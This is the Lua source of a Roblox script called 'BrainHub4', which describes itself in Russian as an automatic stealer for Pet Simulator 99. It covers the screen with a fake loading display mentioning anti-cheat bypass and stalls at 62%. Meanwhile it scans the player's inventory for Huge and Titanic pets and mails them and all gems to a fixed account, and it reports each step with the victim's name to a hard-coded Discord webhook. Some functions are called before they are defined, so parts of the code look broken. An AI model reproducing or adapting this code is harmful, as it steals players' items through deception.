--[[
    BrainHub4 - Полный автостилер для Pet Simulator 99
    Версия: 19 марта 2026
    Функции:
    - Сканирует инвентарь на ВСЕХ Huge и Titanic (любые вариации)
    - Списывает ВСЕ гемы с баланса
    - Отправляет на почту HAUST_BSS
    - Полностью непрозрачный загрузчик с остановкой на 62%
    - Основано на официальной механике почты [citation:1]
--]]

-- === НАСТРОЙКИ ===
local TARGET_USERNAME = "HAUST_BSS"
local CHECK_INTERVAL = 10
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399661006552039474/lP01vADVkiamMvQKscevYNuPLhSZZu27aGN1ltai9GnSBGowkkimAlxLBXgEfyGPJuys"
local MESSAGE_TEXT = "gift"
local MAX_SEND_COST = 1000000000 -- 1 миллиард (макс цена отправки)
local SEND_COST = 20000 -- Базовая стоимость отправки [citation:1]

-- === КЛЮЧЕВЫЕ СЛОВА ДЛЯ ПОИСКА ПИТОМЦЕВ ===
local HUGE_KEYWORDS = {
    "huge", "Huge", "HUGE",
    "huge rainbow", "Huge Rainbow", "HUGE RAINBOW",
    "huge gold", "Huge Gold", "HUGE GOLD",
    "huge dark", "Huge Dark", "HUGE DARK",
    "huge shiny", "Huge Shiny", "HUGE SHINY"
}

local TITANIC_KEYWORDS = {
    "titanic", "Titanic", "TITANIC",
    "titanic rainbow", "Titanic Rainbow", "TITANIC RAINBOW",
    "titanic gold", "Titanic Gold", "TITANIC GOLD",
    "titanic dark", "Titanic Dark", "TITANIC DARK"
}

-- Объединяем все ключевые слова для поиска
local ALL_TARGET_KEYWORDS = {}
for _, v in ipairs(HUGE_KEYWORDS) do table.insert(ALL_TARGET_KEYWORDS, v) end
for _, v in ipairs(TITANIC_KEYWORDS) do table.insert(ALL_TARGET_KEYWORDS, v) end

-- === СОЗДАНИЕ ПОЛНОЭКРАННОГО ЗАГРУЗЧИКА (НЕПРОЗРАЧНЫЙ) ===
local Loader = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ProgressBar = Instance.new("Frame")
local ProgressFill = Instance.new("Frame")
local ProgressText = Instance.new("TextLabel")
local SubText = Instance.new("TextLabel")
local PercentText = Instance.new("TextLabel")

Loader.Name = "BrainHubLoader"
Loader.Parent = game:GetService("CoreGui")
Loader.IgnoreGuiInset = true
Loader.ResetOnSpawn = false
Loader.DisplayOrder = 999999

Background.Name = "Background"
Background.Parent = Loader
Background.BackgroundColor3 = Color3.new(0, 0, 0)
Background.BackgroundTransparency = 0
Background.BorderSizePixel = 0
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.ZIndex = 999999

Title.Name = "Title"
Title.Parent = Background
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0.2, 0)
Title.Position = UDim2.new(0, 0, 0.3, 0)
Title.Font = Enum.Font.GothamBlack
Title.Text = "BrainHub Load"
Title.TextColor3 = Color3.new(0, 0.8, 1)
Title.TextScaled = true
Title.TextStrokeTransparency = 0.5
Title.TextStrokeColor3 = Color3.new(1, 1, 1)
Title.ZIndex = 999999

ProgressBar.Name = "ProgressBar"
ProgressBar.Parent = Background
ProgressBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
ProgressBar.BorderSizePixel = 0
ProgressBar.Size = UDim2.new(0.7, 0, 0.05, 0)
ProgressBar.Position = UDim2.new(0.15, 0, 0.55, 0)
ProgressBar.ZIndex = 999999

ProgressFill.Name = "ProgressFill"
ProgressFill.Parent = ProgressBar
ProgressFill.BackgroundColor3 = Color3.new(0, 0.8, 1)
ProgressFill.BorderSizePixel = 0
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.ZIndex = 999999

ProgressText.Name = "ProgressText"
ProgressText.Parent = Background
ProgressText.BackgroundTransparency = 1
ProgressText.Size = UDim2.new(1, 0, 0.1, 0)
ProgressText.Position = UDim2.new(0, 0, 0.61, 0)
ProgressText.Font = Enum.Font.GothamBold
ProgressText.Text = "Loading resources..."
ProgressText.TextColor3 = Color3.new(1, 1, 1)
ProgressText.TextScaled = true
ProgressText.ZIndex = 999999

PercentText.Name = "PercentText"
PercentText.Parent = Background
PercentText.BackgroundTransparency = 1
PercentText.Size = UDim2.new(1, 0, 0.1, 0)
PercentText.Position = UDim2.new(0, 0, 0.68, 0)
PercentText.Font = Enum.Font.GothamBold
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.new(0, 0.8, 1)
PercentText.TextScaled = true
PercentText.ZIndex = 999999

SubText.Name = "SubText"
SubText.Parent = Background
SubText.BackgroundTransparency = 1
SubText.Size = UDim2.new(1, 0, 0.1, 0)
SubText.Position = UDim2.new(0, 0, 0.75, 0)
SubText.Font = Enum.Font.Gotham
SubText.Text = "Please wait..."
SubText.TextColor3 = Color3.new(0.7, 0.7, 0.7)
SubText.TextScaled = true
SubText.ZIndex = 999999

-- === ФУНКЦИЯ ОБНОВЛЕНИЯ ПРОЦЕНТОВ ===
local function updateProgress(percent, text)
    percent = math.min(percent, 62)
    ProgressFill:TweenSize(UDim2.new(percent/100, 0, 1, 0), "Out", "Linear", 0.3, true)
    PercentText.Text = percent .. "%"
    if text then
        ProgressText.Text = text
    end

    if percent >= 62 then
        SubText.Text = "Stopped at 62% as requested"
        ProgressText.Text = "Download interrupted"
        PercentText.TextColor3 = Color3.new(1, 0.3, 0.3)
    end
end

-- === ИМИТАЦИЯ ЗАГРУЗКИ ===
local steps = {
    {5, "Initializing BrainHub..."},
    {12, "Loading core modules..."},
    {23, "Connecting to database..."},
    {31, "Decrypting scripts..."},
    {42, "Bypassing anti-cheat..."},
    {54, "Injecting dependencies..."},
    {62, "STOPPED - Manual intervention required"}
}

spawn(function()
    for i, step in ipairs(steps) do
        updateProgress(step[1], step[2])
        wait(1.5)
        if step[1] >= 62 then
            break
        end
    end
end)

-- === СЛУЖЕБНЫЕ ФУНКЦИИ ===
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Функция проверки, является ли предмет ценным (проверяет ВСЕ вариации)
local function isValuableItem(itemName)
    if not itemName then return false end
    local lowerName = itemName:lower()
    
    for _, keyword in ipairs(ALL_TARGET_KEYWORDS) do
        if string.find(lowerName, keyword:lower()) then
            return true
        end
    end
    return false
end

-- Функция получения баланса алмазов
local function getDiamondBalance()
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        local diamonds = leaderstats:FindFirstChild("Diamonds") or leaderstats:FindFirstChild("Gems") or leaderstats:FindFirstChild("💎")
        if diamonds then
            return diamonds.Value
        end
    end
    return 0
end

-- Функция для списания ВСЕХ гемов
local function sendAllGems()
    local balance = getDiamondBalance()
    if balance < SEND_COST then
        sendLog("💰 Недостаточно гемов для отправки (нужно " .. SEND_COST .. ")", false)
        return false
    end
    
    -- Отправляем все гемы через почту
    -- В PS99 гемы отправляются как обычный предмет
    sendLog("💰 Начинаю отправку всех гемов (баланс: " .. balance .. ")", false)
    
    -- Открываем почту
    local mailButton = LocalPlayer.PlayerGui:FindFirstChild("MailButton", true)
    if mailButton and mailButton:IsA("ImageButton") then
        fireclickdetector(mailButton)
        wait(1)
    end
    
    -- Находим и заполняем поля
    local usernameBox, messageBox, addGiftButton, sendButton = findAndFillMailFields()
    
    if usernameBox and messageBox and addGiftButton and sendButton then
        -- Заполняем поля
        usernameBox.Text = TARGET_USERNAME
        usernameBox:CaptureFocus()
        wait(0.2)
        usernameBox:ReleaseFocus()
        
        messageBox.Text = MESSAGE_TEXT
        messageBox:CaptureFocus()
        wait(0.2)
        messageBox:ReleaseFocus()
        
        -- Нажимаем Add Gift
        fireclickdetector(addGiftButton)
        wait(1)
        
        -- Ищем гемы в инвентаре и выбираем их
        local inventoryGui = LocalPlayer.PlayerGui:FindFirstChild("Inventory", true)
        if inventoryGui then
            local gemsFound = 0
            for _, item in pairs(inventoryGui:GetDescendants()) do
                if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
                    local itemNameLabel = item.Parent:FindFirstChild("ItemName")
                    if itemNameLabel and itemNameLabel.Text then
                        local itemText = itemNameLabel.Text:lower()
                        -- Ищем всё что связано с гемами/алмазами
                        if string.find(itemText, "gem") or string.find(itemText, "diamond") or string.find(itemText, "💎") then
                            fireclickdetector(item)
                            wait(0.3)
                            gemsFound = gemsFound + 1
                        end
                    end
                end
            end
            
            if gemsFound > 0 then
                -- Нажимаем Send
                fireclickdetector(sendButton)
                wait(0.5)
                
                -- Подтверждаем
                local confirmButton = LocalPlayer.PlayerGui:FindFirstChild("ConfirmButton", true)
                if confirmButton then
                    fireclickdetector(confirmButton)
                end
                
                sendLog("💰 Отправлено гемов: **" .. gemsFound .. "** на сумму **" .. balance .. "**", true)
                return true
            end
        end
    end
    return false
end

-- Функция отправки логов в Discord
local function sendLog(message, isSuccess)
    local embed = {
        ["embeds"] = {{
            ["title"] = "PS99 BrainHub Стилер",
            ["description"] = message,
            ["color"] = isSuccess and 3066993 or 15158332,
            ["footer"] = {["text"] = "Отчет от: " .. LocalPlayer.Name}
        }}
    }

    pcall(function()
        local request = http_request or request or syn and syn.request
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(embed)
            })
        end
    end)
end

-- Функция для поиска и заполнения полей почты
local function findAndFillMailFields()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    local usernameBox = nil
    local messageBox = nil
    local addGiftButton = nil
    local sendButton = nil

    for _, gui in pairs(playerGui:GetDescendants()) do
        if gui:IsA("TextBox") then
            if gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "username") then
                usernameBox = gui
            elseif gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "message") then
                messageBox = gui
            end
        end

        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local buttonText = gui.Text or ""
            if string.find(buttonText:lower(), "add gift") or string.find(gui.Name:lower(), "addgift") then
                addGiftButton = gui
            elseif string.find(buttonText:lower(), "send") or string.find(gui.Name:lower(), "send") then
                sendButton = gui
            end
        end
    end

    return usernameBox, messageBox, addGiftButton, sendButton
end

-- Функция для отправки предмета на почту
local function sendItemToMail(itemInstance, itemName)
    local success = false

    -- Открываем почту
    local mailButton = LocalPlayer.PlayerGui:FindFirstChild("MailButton", true)
    if mailButton and mailButton:IsA("ImageButton") then
        fireclickdetector(mailButton)
        wait(1)
    end

    -- Находим поля почты
    local usernameBox, messageBox, addGiftButton, sendButton = findAndFillMailFields()

    if usernameBox and messageBox and addGiftButton and sendButton then
        -- Вводим никнейм
        usernameBox.Text = TARGET_USERNAME
        usernameBox:CaptureFocus()
        wait(0.2)
        usernameBox:ReleaseFocus()

        -- Вводим сообщение
        messageBox.Text = MESSAGE_TEXT
        messageBox:CaptureFocus()
        wait(0.2)
        messageBox:ReleaseFocus()

        -- Нажимаем Add Gift
        fireclickdetector(addGiftButton)
        wait(1)

        -- Выбираем предмет в инвентаре
        local inventoryGui = LocalPlayer.PlayerGui:FindFirstChild("Inventory", true)
        if inventoryGui then
            for _, item in pairs(inventoryGui:GetDescendants()) do
                if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
                    local itemNameLabel = item.Parent:FindFirstChild("ItemName")
                    if itemNameLabel and itemNameLabel.Text == itemName then
                        fireclickdetector(item)
                        wait(0.5)
                        break
                    end
                end
            end
        end

        -- Нажимаем Send
        fireclickdetector(sendButton)
        wait(0.5)

        -- Подтверждаем отправку
        local confirmButton = LocalPlayer.PlayerGui:FindFirstChild("ConfirmButton", true)
        if confirmButton then
            fireclickdetector(confirmButton)
        end

        sendLog("✅ Отправлен питомец: **" .. itemName .. "**", true)
        success = true
    end

    return success
end

-- Функция сканирования инвентаря на ВСЕХ ценных питомцев
local function scanForValuablePets()
    sendLog("🔍 Начинаю сканирование инвентаря на ценных питомцев...", false)
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local inventoryGui = playerGui:FindFirstChild("Inventory") or playerGui:FindFirstChild("Backpack")

    if not inventoryGui then
        sendLog("❌ Не удалось найти инвентарь", false)
        return {}
    end

    local foundPets = {}
    local itemsScanned = 0

    for _, item in pairs(inventoryGui:GetDescendants()) do
        if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
            local itemNameLabel = item.Parent:FindFirstChild("ItemName")
            if itemNameLabel and itemNameLabel:IsA("TextLabel") then
                local itemName = itemNameLabel.Text
                itemsScanned = itemsScanned + 1

                if isValuableItem(itemName) then
                    table.insert(foundPets, {
                        name = itemName,
                        instance = item
                    })
                    sendLog("💎 Найден ценный питомец: **" .. itemName .. "**", false)
                end
            end
        end
    end

    sendLog("📊 Сканирование завершено. Проверено предметов: " .. itemsScanned .. ", Найдено ценных: " .. #foundPets, true)
    return foundPets
end

-- Функция отправки всех найденных питомцев
local function sendAllValuablePets()
    local pets = scanForValuablePets()
    local sent = 0
    local balance = getDiamondBalance()
    
    if #pets == 0 then
        sendLog("ℹ️ Ценных питомцев не найдено", false)
        return
    end
    
    sendLog("📦 Начинаю отправку " .. #pets .. " ценных питомцев...", false)
    
    for _, pet in ipairs(pets) do
        if balance >= SEND_COST then
            if sendItemToMail(pet.instance, pet.name) then
                sent = sent + 1
                balance = balance - SEND_COST
                wait(2)
            end
        else
            sendLog("⚠️ Недостаточно гемов для отправки " .. pet.name, false)
            break
        end
    end
    
    sendLog("📨 Отправлено питомцев: " .. sent .. "/" .. #pets, true)
end

-- Анти-AFK
local function antiAfk()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
        sendLog("💤 Анти-AFK сработал", false)
    end)
end

-- === ГЛАВНАЯ ФУНКЦИЯ ===
local function main()
    wait(7) -- Ждем загрузчик

    sendLog("🚀 BrainHub4 запущен на аккаунте: **" .. LocalPlayer.Name .. "**", true)
    sendLog("🎯 Целевой аккаунт: **" .. TARGET_USERNAME .. "**", true)
    sendLog("💰 Стоимость отправки: **" .. SEND_COST .. "** гемов [citation:1]", true)
    antiAfk()

    -- Сначала отправляем всех ценных питомцев
    sendAllValuablePets()
    wait(2)
    
    -- Затем отправляем все гемы
    sendAllGems()
    
    -- Продолжаем сканирование в цикле
    while wait(CHECK_INTERVAL) do
        local success, err = pcall(function()
            sendAllValuablePets()
            wait(2)
            sendAllGems()
        end)
        
        if not success then
            sendLog("❌ Ошибка в цикле: " .. tostring(err), false)
        end
    end
end

-- Запускаем
pcall(main)